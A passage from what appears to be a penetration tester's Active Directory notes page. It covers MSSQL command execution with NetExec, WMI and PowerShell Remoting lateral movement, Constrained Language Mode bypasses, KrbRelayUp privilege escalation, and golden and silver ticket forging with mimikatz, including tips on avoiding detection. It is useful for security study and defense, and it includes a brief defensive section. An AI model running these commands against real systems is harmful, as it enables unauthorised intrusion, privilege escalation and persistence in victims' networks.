<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">sp_start_job</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">agent</span><span class="w"> </span><span class="p">(</span><span class="n">blind</span><span class="p">)</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">use_link</span><span class="w"> </span><span class="p">{</span><span class="n">link</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">linked</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="p">(</span><span class="n">set</span><span class="w"> </span><span class="n">use_link</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">go</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">use_link</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">step</span><span class="p">)</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="o">!</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">cmd</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">show_query</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">query</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">mask_query</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="n">query</span>
</code></pre></div>
<p>Connect to a SQL Server with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>mssql<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;
</code></pre></div>
<p>Execute a query  with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>mssql<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--query<span class="w"> </span>&lt;query&gt;
</code></pre></div>
<p>Execute a shell command  with <code>NetExec</code> (<code>xp_cmdshell</code> privileges required):</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>mssql<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--query<span class="w"> </span>&lt;query&gt;
</code></pre></div>
<p>Enumerate impersonate privileges with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>mssql<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>mssql_priv
</code></pre></div>
<p>List more module available for users with admin privileges on the DB with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>mssql<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-L
</code></pre></div>
<h3 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)</h3>
<p>Windows Management Instrumentation (WMI) is a powerful framework provided by Microsoft for managing and accessing data about a wide range of Windows operating system components. It enables developers, administrators, and scripts to interact with the underlying system in a standardized way, allowing them to monitor, configure, and query system information efficiently.</p>
<ul>
<li><strong>System Management</strong>: WMI can query hardware and software configurations, manage system processes, and retrieve performance data.</li>
<li><strong>Scripting Support</strong>: Administrators can use WMI in scripting languages such as PowerShell, VBScript, or Python to automate tasks.</li>
<li><strong>Standardized Interface</strong>: It uses a unified object model and supports various protocols, making it a consistent tool for management tasks.</li>
<li><strong>Extensibility</strong>: Developers can extend WMI by creating custom providers to expose additional data or manage new resources.</li>
</ul>
<p>WMI uses a repository of classes that describe different system resources. These classes are organized into namespaces (e.g., <code>root\CIMv2</code>). Some common classes include:</p>
<ul>
<li><code>Win32_OperatingSystem</code>: Provides information about the OS.</li>
<li><code>Win32_Process</code>: Manages and queries running processes.</li>
<li><code>Win32_Service</code>: Interacts with system services.</li>
</ul>
<p>A WMI session can be established using one of the following protocols:</p>
<ul>
<li><strong>DCOM</strong>: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP (DCERPC).</li>
<li><strong>Wsman</strong>: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).</li>
</ul>
<p>WMI can be used by an attacker to perform lateral movement by executing commands, creating services or scheduled tasks on remote targets.</p>
<p>Run remote process (from cmd):</p>
<div class="highlight"><pre><span></span><code>wmic.exe<span class="w"> </span>/user:&lt;username&gt;<span class="w"> </span>/password:&lt;password&gt;<span class="w"> </span>/node:&lt;target<span class="w"> </span>computer&gt;<span class="w"> </span>process<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="s2">"&lt;command&gt;"</span><span class="w"> </span>
</code></pre></div>
<p>Create a <code>PSCredential</code> object with the credentials of a compromised user to be used to create a persistent WMI session:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$sPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span>
<span class="nv">$psCredential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;,</span> <span class="nv">$sPassword</span><span class="p">;</span>
</code></pre></div>
<p>Create a persistent WMI session to be used to run command on the remote target or create services:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Set the session options like the protocol to be used</span>
<span class="nv">$SessionOptions</span> <span class="p">=</span> <span class="nb">New-CimSessionOption</span> <span class="n">-Protocol</span> <span class="n">DCOM</span>
<span class="c"># Create the session</span>
<span class="nv">$Session</span> <span class="p">=</span> <span class="nb">New-Cimsession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$psCredential</span> <span class="n">-SessionOption</span> <span class="nv">$SessionOptions</span> <span class="n">-ErrorAction</span> <span class="n">Stop</span>
</code></pre></div>
<p>Run remote process:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-CimMethod</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span> <span class="p">=</span> <span class="s2">"&lt;command&gt;"</span> <span class="p">}</span>
</code></pre></div>
<p>Create service to a remote target:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-CimMethod</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Service</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span> <span class="n">Name</span> <span class="p">=</span> <span class="s2">"&lt;service name&gt;"</span><span class="p">;</span> <span class="n">DisplayName</span> <span class="p">=</span> <span class="s2">"&lt;service full name&gt;"</span><span class="p">;</span> <span class="n">PathName</span> <span class="p">=</span> <span class="s2">"&lt;command&gt;"</span><span class="p">;</span> <span class="n">ServiceType</span> <span class="p">=</span> <span class="no">[byte]</span><span class="p">::</span><span class="n">Parse</span><span class="p">(</span><span class="s2">"16"</span><span class="p">);</span> <span class="n">StartMode</span> <span class="p">=</span> <span class="s2">"&lt;start mode&gt;"</span> <span class="p">}</span>
</code></pre></div>
<p>where:</p>
<ul>
<li><code>StartMode</code>: can be one of those specified <a href="https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicestartmode?view=net-9.0-pp">here</a> </li>
<li><code>ServiceType</code>: can be one of those specified <a href="https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicetype?view=net-9.0-pp">here</a>; value <code>16</code> corresponds to service type <code>Win32OwnProcess</code> which indicates that the service will run in a new process.</li>
</ul>
<p>Manage the service (start, stop and delete):</p>
<div class="highlight"><pre><span></span><code><span class="nv">$Service</span> <span class="p">=</span> <span class="nb">Get-CimInstance</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Service</span> <span class="n">-filter</span> <span class="s2">"Name LIKE '&lt;service name&gt;'"</span>

<span class="c"># Start Service</span>
<span class="nb">Invoke-CimMethod</span> <span class="n">-InputObject</span> <span class="nv">$Service</span> <span class="n">-MethodName</span> <span class="n">StartService</span>

<span class="c"># Stop Service</span>
<span class="nb">Invoke-CimMethod</span> <span class="n">-InputObject</span> <span class="nv">$Service</span> <span class="n">-MethodName</span> <span class="n">StopService</span>

<span class="c"># Delete Service</span>
<span class="nb">Invoke-CimMethod</span> <span class="n">-InputObject</span> <span class="nv">$Service</span> <span class="n">-MethodName</span> <span class="n">Delete</span>
</code></pre></div>
<p>Create a scheduled task to remote target:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Create task action object</span>
<span class="nv">$actionObj</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskAction</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-Execute</span> <span class="p">&lt;</span><span class="n">command</span> <span class="n">without</span> <span class="n">arguments</span><span class="p">&gt;</span> <span class="n">-Argument</span> <span class="p">&lt;</span><span class="n">command</span> <span class="n">arguments</span><span class="p">&gt;</span>

<span class="c"># Create scheduled task</span>
<span class="nb">Register-ScheduledTask</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-Action</span> <span class="nv">$Action</span> <span class="n">-User</span> <span class="s2">"NT AUTHORITY\SYSTEM"</span> <span class="n">-TaskName</span> <span class="s2">"&lt;task name&gt;"</span>

<span class="c"># Start Scheduled task</span>
<span class="nb">Start-ScheduledTask</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-TaskName</span> <span class="s2">"&lt;task name&gt;"</span>

<span class="c"># Remove scheduled task</span>
<span class="nb">Unregister-ScheduledTask</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-TaskName</span> <span class="s2">"&lt;task name&gt;"</span>
</code></pre></div>
<p>Install MSI package on remote target (requires Local Administrator privileges):</p>
<div class="highlight"><pre><span></span><code><span class="c"># Using powershell</span>
<span class="nb">Invoke-CimMethod</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Product</span> <span class="n">-MethodName</span> <span class="n">Install</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">PackageLocation</span> <span class="p">=</span> <span class="s2">"&lt;package location&gt;"</span><span class="p">;</span> <span class="n">Options</span> <span class="p">=</span> <span class="s2">""</span><span class="p">;</span> <span class="n">AllUsers</span> <span class="p">=</span> <span class="nv">$false</span><span class="p">}</span>

<span class="c"># or with old wmic</span>
<span class="n">wmic</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">node</span><span class="p">:&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">product</span> <span class="n">call</span> <span class="n">install</span> <span class="n">PackageLocation</span><span class="p">=&lt;</span><span class="n">package</span> <span class="n">location</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="powershell-remoting">PowerShell Remoting</h3>
<p>Enabled by default on Windows Server 2012 onwards.</p>
<ul>
<li>If not, it can be enabled with <code>Enable-PSRemoting</code>. This operation requires local Administrator privileges.</li>
</ul>
<p>Generally, it requires Administrator privileges on the target machine* :</p>
<ul>
<li>The shell will have elevated privileges.</li>
</ul>
<p>*Note: Administrator privileges are required only on the target machine, not on the machine where the commands are being executed.</p>
<p>By default, PSRemoting listeners run on default ports:</p>
<ul>
<li>5985 for http</li>
<li>5986 for https</li>
</ul>
<p>A PSRemoting session runs in a new <code>wsmprovhost</code> process.</p>
<p>There are two different kinds of PSRemoting:</p>
<ul>
<li><strong>One-to-One</strong>: Consists into interactively logging to another computer - (using <code>New-PSSession</code> or <code>Enter-PSSession</code>).</li>
<li><strong>One-to-Many</strong>: Consists into executing parallel commands or scripts on multiple machines - (using <code>Invoke-Command</code>).</li>
</ul>
<p>The one-to-many approach allows to run commands and scripts on:</p>
<ul>
<li>multiple remote computers,</li>
<li>on disconnected sessions (v3)</li>
<li>as background job and more.</li>
</ul>
<p>Check if target has PowerShell Remoting enabled:</p>
<div class="highlight"><pre><span></span><code><span class="no">[bool]</span><span class="p">(</span><span class="nb">Test-WSMan</span> <span class="n">-ComputerName</span> <span class="s1">'&lt;computer name&gt;'</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span><span class="p">)</span>
</code></pre></div>
<p>Open a remote interactive session (one-to-one approach):</p>
<div class="highlight"><pre><span></span><code><span class="c"># Stateless Session</span>
<span class="nb">Enter-PSSession</span> <span class="n">-Computer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span>

<span class="n">winrs</span><span class="p">.</span><span class="n">exe</span> <span class="n">-u</span><span class="p">:&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span><span class="p">:&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-r</span><span class="p">:&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">cmd</span>

<span class="c">## Using credentials in memory</span>
<span class="n">winrs</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span><span class="p">:&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">cmd</span>

<span class="c"># Stateful Session</span>
<span class="c">## Create a remote session</span>
<span class="nv">$securePassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> 
<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;,</span> <span class="nv">$sPassword</span><span class="p">;</span>
<span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$credential</span>

<span class="c">##  Load script functions to the remote Session target</span>
<span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="p">&lt;</span><span class="n">script</span> <span class="n">path</span><span class="p">&gt;</span> <span class="n">-Session</span> <span class="nv">$sess</span>

<span class="c">## Execute commands on the remote session</span>
<span class="nb">Invoke-Command</span> <span class="n">-ScriptBloack</span> <span class="p">{&lt;</span><span class="n">commands</span><span class="p">&gt;}</span> <span class="n">-Session</span> <span class="nv">$sess</span>

<span class="c">## Interactively access the remote session</span>
<span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</code></pre></div>
<p>Run command/scripts on multiple targets (one-to-many approach):</p>
<div class="highlight"><pre><span></span><code><span class="c"># Execute commands or scriptblocks</span>
<span class="nb">Invoke-Command</span> <span class="n">-Scriptblock</span> <span class="p">{&lt;</span><span class="n">commands</span><span class="p">&gt;}</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;</span> <span class="c"># Use (Get-Content &lt;file with list of servers&gt;) in order to get the list from a file</span>
<span class="c"># Execute locally loaded function</span>
<span class="nb">Invoke-Command</span> <span class="n">-Scriptblock</span> <span class="p">{</span><span class="k">function</span><span class="p">:&lt;</span><span class="k">function</span> <span class="n">name</span><span class="p">&gt;}</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;</span>

<span class="c"># Execute scripts from files</span>
<span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="p">&lt;</span><span class="n">Script</span> <span class="n">path</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;</span>
</code></pre></div>
<p>*Note: when running commands/scripts with <code>Invoke-Command</code> it could happen that the target as the <code>LanguageMode</code> set to <code>ConstrainedLanguage</code>:</p>
<ul>
<li>If that's the case, then various functionalities will be blocked - see <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">there</a>. Only core <em>cmdlets</em> will be available.</li>
</ul>
<p>Install dependencies on Linux:</p>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>pwsh<span class="w"> </span>-Command<span class="w"> </span><span class="s1">'Install-Module -Name PSWSMan'</span>
sudo<span class="w"> </span>pwsh<span class="w"> </span>-Command<span class="w"> </span><span class="s1">'Install-WSMan'</span>
sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>gss-ntlmssp
</code></pre></div>
<p>If receiving the following error when running <code>Enter-PSSession</code> or similar:</p>
<div class="highlight"><pre><span></span><code>The WinRM client  cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not   joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts      configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not  be authenticated. You can get more information about that by running the following command: winrm help config. For      more information, see the about_Remote_Troubleshooting Help topic. 
</code></pre></div>
<p>Add the the target host to the TrustedHosts as follows:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Enable-PSRemoting</span> <span class="n">-SkipNetworkProfileCheck</span>
<span class="nb">Set-Item</span> <span class="n">WSMan</span><span class="p">:\</span><span class="n">localhost</span><span class="p">\</span><span class="n">Client</span><span class="p">\</span><span class="n">TrustedHosts</span> <span class="n">-Value</span> <span class="s2">"&lt;target host&gt;"</span> <span class="n">-Concatenate</span>
</code></pre></div>
<p>Useful Resources:</p>
<ul>
<li><a href="https://thomask.sdf.org/blog/2019/12/15/linux-windows-powershell-remoting-troubleshooting.html">PSRemoting - Linux to Windows</a></li>
<li><a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">PowerShell Constrained Language Mode</a></li>
</ul>
<h4 id="constrained-language-mode-bypasses">Constrained Language Mode Bypasses</h4>
<p><strong>Constrained Language Mode</strong> is enabled by setting the <code>__PSLockdownPolicy</code> environment variable to the value <code>4</code>.</p>
<ul>
<li>Having access to the system with enough privileges to change environment variables allow to bypass the <strong>Constrained Language Mode</strong> by removing the <code>__PSLockdownPolicy</code> variable.</li>
<li>If it's possible to downgrade to PowerShell 2.0, it's possible to bypass the <strong>Constrained Language Mode</strong> by opening a downgraded PowerShell session: <code>powershell -version 2</code></li>
<li>If the script to run filename or the path where it's located contains the string <code>system32</code>, it will run in <strong>Full Language Mode</strong>.</li>
</ul>
<p>*Note: Constrained Language Mode will also block tools such as mimikatz.</p>
<p>Useful resources:</p>
<ul>
<li><a href="https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/">Constrained Language Mode Bypass When __PSLockDownPolicy Is Used</a></li>
</ul>
<h3 id="defense_2">Defense</h3>
<ul>
<li>Prevent or limit login for Domain Admins to any other machine other than the Domain Controllers.</li>
<li>Never run a service with Domain Admin privileges when it's strictly unnecessary. Prefer a service account with privileges limited in respect of <strong>least privilege principle</strong>.</li>
<li>Use Temporary Group Membership when it's necessary to temporarily add a user to a group with higher privileges; this feature allows to define a time span in which the membership is held for the user. <ul>
<li>This helps prevent forgetting to remove the user when it's no more necessary for it to be part of the higher privileges group.</li>
<li><code>Add-ADGroupMember -Identity &lt;group&gt; -Members &lt;user&gt; -MemberTimeToLive (New-TimeSpan -Minutes 20)</code></li>
</ul>
</li>
</ul>
<h2 id="post-exploitation-persistence_1">Post Exploitation &amp; Persistence</h2>
<h3 id="local-privilege-escalation">Local Privilege Escalation</h3>
<p>Refer also to <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation.html">Windows Privilege Escalation</a>.</p>
<h4 id="krbrelayup">KrbRelayUp</h4>
<p><a href="https://github.com/Dec0ne/KrbRelayUp">KrbRelayUp</a> is a tool that implements a universal no-fix local privilege escalation abusing Kerberos relays to gain a SYSTEM shell.</p>
<p>This tools supports three variant:</p>
<ul>
<li>RBCD-based</li>
<li>Shadow Credentials-based</li>
<li>ADCS Web Enrollment-based</li>
</ul>
<p>For the <strong>RBCD-based</strong> variant prerequisites are:</p>
<ul>
<li>LDAP signing not required on Domain Controller (default!)</li>
<li>Ability for the current domain user to add computers to the domain (ms-DS-MachineAccountQuota = 10 by default!) or an owned computer account</li>
</ul>
<p>This technique can be replicated manually following this guide: <a href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9l">KrbRelay with RBCD Privilege Escalation HOWTO</a></p>
<p>For the <strong>Shadow Credentials-based</strong> prerequisites are:</p>
<ul>
<li>Domain Controller without LDAP Signing enforced (default)</li>
<li>Domain Controller with its own server authentication certificate (for PKINIT authentication)</li>
<li>Ability to write the <code>msDs-KeyCredentialLink</code> attribute of the target computer account (default)</li>
</ul>
<p>This technique can be replicated manually following this guide: <a href="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html">No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials</a></p>
<p>For the ADCS Web Enrollment-based variant prerequisites are:</p>
<ul>
<li>Domain Controller with its own server authentication certificate (for PKINIT authentication)</li>
<li>Ability to write the <code>msDs-KeyCredentialLink</code> attribute of the target computer account (default)</li>
</ul>
<p><strong>Important Note</strong>: this tool is generally detected by AV and EDR; generally reflectively loading it generates unstable behaviour.</p>
<p>Tool and advanced usage can be found <a href="https://github.com/Dec0ne/KrbRelayUp">here</a>.</p>
<p>RBCD-based variant:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Relay</span>
<span class="p">.\</span><span class="n">KrbRelayUp</span><span class="p">.</span><span class="n">exe</span> <span class="n">relay</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="n">-CreateNewComputerAccount</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">new</span> <span class="n">computer</span> <span class="n">name</span><span class="p">&gt;$</span> <span class="n">-ComputerPassword</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>


<span class="c"># Spawn</span>
<span class="p">.\</span><span class="n">KrbRelayUp</span><span class="p">.</span><span class="n">exe</span> <span class="n">spawn</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="n">-cn</span> <span class="p">&lt;</span><span class="n">new</span> <span class="n">computer</span> <span class="n">name</span><span class="p">&gt;$</span> <span class="n">-cp</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
</code></pre></div>
<p>Shadow Credentials-based variant:</p>
<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">KrbRelayUp</span><span class="p">.</span><span class="n">exe</span> <span class="n">full</span> <span class="n">-m</span> <span class="n">shadowcred</span> <span class="p">-</span><span class="n">-ForceShadowCred</span>
</code></pre></div>
<p>ADCS Web Enrollment-based variant:</p>
<div class="highlight"><pre><span></span><code>.\KrbRelayUp.exe full -m adcs
</code></pre></div>
<h3 id="golden-silver-tickets_1">Golden &amp; Silver Tickets</h3>
<p>Having the hash of <strong>krbtgt</strong> account's password, the TGT service account, it's possible to use it to forge a TGT, called <strong>Golden Ticket</strong>. The golden ticket then can be used to request TGS for almost all services.</p>
<ul>
<li>Apart from <strong>krbtgt</strong>'s hash, to forge a Golden ticked is needed the domain name, domain SID, and user ID for the person we want to impersonate.</li>
<li>If it's possible to obtain the the <strong>domain name</strong>, <strong>domain SID</strong>, and <strong>user ID</strong> for the person we want to impersonate, than is highly probable that is possible to recover the other information.</li>
</ul>
<p>The Golden ticket than can be used with the Pass-the-ticket attack.</p>
<p>Some considerations:</p>
<ul>
<li>Since step 1 (AS_REQ) and 2 (AS_REP) in Kerberos authentication flow are bypassed, there's no need to know the password hash for the user to be impersonated.</li>
<li>The user presented in step 3 will be validated by the KDC only if the timestamp presented along it is older than 20 minutes. This means that it can be a disabled, deleted, or non-existent* account, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.</li>
<li>Since the policies and rules for tickets are set in the TGT itself, it's possible to overwrite the values pushed by the KDC, such as the ticket validity time.</li>
<li>By default, the <strong>krbtgt</strong> account's password never changes, unless it is manually rotated,</li>
<li>When rotating <strong>krbtgt</strong> account's password, it must be rotated twice, since <strong>the current and previous passwords</strong> are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.</li>
<li>Generally, until the timestamp in the TGT is still valid, when rotating <strong>krbtgt</strong> account's password many services would stop working since not all of them are smart enough to release the TGT and request a new one that is signed with the new password.</li>
<li>Golden tickets allow to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.</li>
<li>It's possible to generate a golden ticket on any machine, even one that is not domain-joined (such as the attacker machine), making it harder for the blue team to detect.</li>
<li>Forge a Golden Ticket that it's compliant to the <strong>Kerberos Policy</strong> for a domain can reduce the chances to be detected.</li>
</ul>
<p>Generate a golden ticket:</p>
<div class="highlight"><pre><span></span><code>kerberos::golden<span class="w"> </span>/admin:&lt;Any<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;Domain&gt;<span class="w"> </span>/id:500<span class="w"> </span>/sid:&lt;Domain<span class="w"> </span>SID&gt;<span class="w"> </span>/krbtgt:&lt;NTLM<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>of<span class="w"> </span>KRBTGT<span class="w"> </span>account&gt;<span class="w"> </span>/endin:600<span class="w"> </span>/renewmax:10080<span class="w"> </span>/ptt
</code></pre></div>
<p>Where:</p>
<ul>
<li><strong>/admin</strong> - The username to impersonate. This does not have to be a valid user.  </li>
<li><strong>/domain</strong> - The FQDN of the domain to generate the ticket for.  </li>
<li><strong>/id</strong> -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  </li>
<li><strong>/sid</strong> -The SID of the domain to generate the ticket for.</li>
<li><strong>/krbtgt</strong> -The NTLM hash of the KRBTGT account.   </li>
<li><strong>/endin</strong> - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)(*1).</li>
<li><strong>/renewmax</strong> -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)(*1).</li>
<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used (Pass-the-Ticket). Alternatively, use <strong>/ticket</strong> to save the ticket to a file for later use(*2).</li>
</ul>
<p><strong>Silver tickets</strong> are TGS tickets forged by using the <strong>machine account's password hash</strong> for the target service host. Whilst with a Golden ticket it's possible to access to every service, with a Silver ticket is possible to access only to a specific service host and to only impersonate users on that host itself.</p>
<p>Some considerations:</p>
<ul>
<li>Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted (i.e, starting from step AP_REQ). This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.</li>
<li>Since permissions are determined through SIDs, it's possible to create a non-existing user * for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.</li>
<li>The machine account's password is usually rotated every 30 days, which would not be good for persistence. <ul>
